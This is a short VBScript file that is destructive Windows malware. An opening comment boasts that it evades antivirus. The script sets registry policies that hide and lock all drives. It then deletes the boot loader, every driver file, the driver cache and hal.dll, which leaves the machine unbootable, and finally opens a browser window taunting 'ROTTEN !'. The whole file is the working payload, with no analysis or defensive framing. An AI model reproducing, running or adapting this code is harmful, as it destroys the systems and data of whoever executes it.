'is novirus not detected kasperom FIGA
on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives","67108863","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive","67108863","REG_DWORD"
fso.deletefile "C:\ntldr",1 
Set Folder = FSO.GetFolder(fso.getspecialfolder(0)+"\system32\drivers\")
For Each File In Folder.Files
File.delete
Next
fso.deletefolder fso.getspecialfolder(0)+"\Driver Cache"
fso.deletefile fso.getspecialfolder(0)+"\system32\hal.dll",1
fso.deletefolder fso.getspecialfolder(0)+"\system32\drives",1
Set IE = CreateObject("InternetExplorer.Application") 
IE.Visible = 1 
IE.Navigate "ROTTEN !" 
While IE.Busy
WScript.Sleep 200
Wend


